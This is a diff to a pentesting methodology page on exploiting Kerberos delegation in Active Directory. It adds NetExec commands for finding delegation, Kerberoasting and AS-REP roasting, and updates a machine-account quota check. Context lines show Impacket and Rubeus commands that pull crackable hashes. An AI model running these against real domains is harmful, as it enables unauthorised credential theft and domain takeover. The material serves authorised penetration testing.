@@ -5,7 +5,7 @@ category: Methodology
 subcategory: Active Directory Attack
 order: 2
 tags: ["active-directory", "kerberos", "delegation", "kerberoasting", "pentesting"]
-updated: 2026-04-11
+updated: 2026-04-21
 ---
 
 # Part 2: Exploiting Kerberos Delegation
@@ -48,6 +48,9 @@ Get-DomainComputer | ? {$_.'msds-allowedtoactonbehalfofotheridentity' -ne $null}
 ```bash
 # Impacket — find delegation
 findDelegation.py domain.local/user:pass -dc-ip DC_IP
+
+# NetExec — same data via LDAP module
+nxc ldap DC_IP -u user -p pass -M find-delegation
 ```
 
 ---
@@ -167,7 +170,7 @@ By default, any domain user can create up to 10 machine accounts (`MachineAccoun
 
 ```bash
 # Check quota
-crackmapexec ldap dc01 -u user -p pass -M maq
+nxc ldap dc01 -u user -p pass -M maq
 
 # Create machine account
 addcomputer.py domain.local/user:pass \
@@ -238,6 +241,9 @@ Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.txt
 ```bash
 # Impacket (from Linux)
 GetUserSPNs.py domain.local/user:pass -request -dc-ip DC_IP -outputfile hashes.txt
+
+# NetExec — one-shot Kerberoast
+nxc ldap DC_IP -u user -p pass --kerberoasting hashes.txt
 ```
 
 ### Crack
@@ -287,6 +293,9 @@ GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -dc-ip DC_IP -o
 
 # Without a user list (uses LDAP query)
 GetNPUsers.py domain.local/user:pass -request -format hashcat
+
+# NetExec — one-shot AS-REP Roast
+nxc ldap DC_IP -u user -p pass --asreproast asrep.txt
 ```
 
 ```powershell
